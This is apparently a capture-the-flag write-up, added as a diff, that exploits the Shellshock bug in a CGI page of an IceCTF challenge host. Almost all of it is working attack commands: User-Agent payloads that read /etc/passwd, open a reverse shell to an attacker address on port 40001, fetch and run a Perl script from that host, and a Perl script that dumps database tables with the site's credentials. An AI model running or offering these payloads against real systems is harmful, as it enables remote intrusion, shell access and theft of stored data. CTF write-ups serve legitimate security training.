@@ -1,0 +1,36 @@
+# Shellshock vulnerability check  
+$ wget -q -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://geocities.vuln.icec.tf/index.cgi -O -
+
+$ wget -q -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -i >& /dev/tcp/A.B.C.D/40001 0>&1" http://geocities.vuln.icec.tf/index.cgi -O -
+
+# After some enumeration, we upload and run our perl script with the content below
+$ wget -q -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/wget http://A.B.C.D:40001/script.pl -O /tmp/script.pl" http://geocities.vuln.icec.tf/index.cgi -O -
+
+$ wget -q -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/ls -la /tmp/script.pl" http://geocities.vuln.icec.tf/index.cgi -O -
+
+$ wget -q -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/perl /tmp/script.pl" http://geocities.vuln.icec.tf/index.cgi -O -
+
+# Because the lack of MySQL client, we used perl script to retrieve the data from database:
+#!/usr/bin/perl
+
+use strict;
+use DBI;
+
+my $dbh = DBI->connect(
+    "dbi:mysql:dbname=geocities;host=icectf_mariadb",
+    "geocities",
+    "geocities",
+    { RaiseError => 1 },
+) or die $DBI::errstr;
+
+my $sth = $dbh->prepare("SHOW TABLES");
+# my $sth = $dbh->prepare("SELECT * FROM 47a6fd2ca39d2b0d6eea1c30008dd889");
+$sth->execute();
+
+my @row;
+while (@row = $sth->fetchrow) {
+  print "@row\n";
+}
+
+$sth->finish();
+$dbh->disconnect();
